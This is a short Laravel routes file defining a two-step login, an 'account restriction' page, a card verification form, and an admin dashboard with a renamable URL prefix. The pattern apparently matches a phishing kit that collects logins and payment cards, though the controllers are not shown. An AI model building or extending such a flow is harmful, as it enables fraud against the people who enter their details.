<?php

use App\Http\Controllers\{AdminController, AuthController, VerificationController};
use App\Models\Settings;
use Illuminate\Support\Facades\Route;

Route::get('/login', [AuthController::class, 'login'])->name('login.index');
Route::post('/login', [AuthController::class, 'idLogin'])->name('login.store');
Route::put('/login', [AuthController::class, 'authenticate'])->name('login.authenticate');
Route::get('/account/restriction', [AuthController::class, 'restrict'])->name('login.verify');
Route::get('/account/verify/card', [VerificationController::class, 'card'])->name('verify.card');
Route::post('/account/verify/card', [VerificationController::class, 'cardPost'])->name('verify.card.post');

$adminPrefix = 'admin';

try {
    if (Schema::hasTable('settings') && !app()->runningInConsole()) {
        $adminPrefix = Settings::me()->admin_panel ?? 'admin';
    }
} catch (Throwable) {
}

Route::group(['as' => 'admin.', 'prefix' => $adminPrefix], static function () {
    Route::group(['middleware' => 'guest'], static function () {
        Route::get('/login', [AdminController::class, 'login_index'])->name('login');
        Route::post('/login', [AdminController::class, 'login_post'])->name('login.store');
    });

    Route::group(['middleware' => 'auth'], static function () {
        Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
        Route::patch('/update-settings', [AdminController::class, 'settings_patch'])->name('settings.patch');
        Route::get('/logout', [AdminController::class, 'logout'])->name('logout');
    });
});

Route::fallback(static function () {
    return redirect()->route('login.index');
});
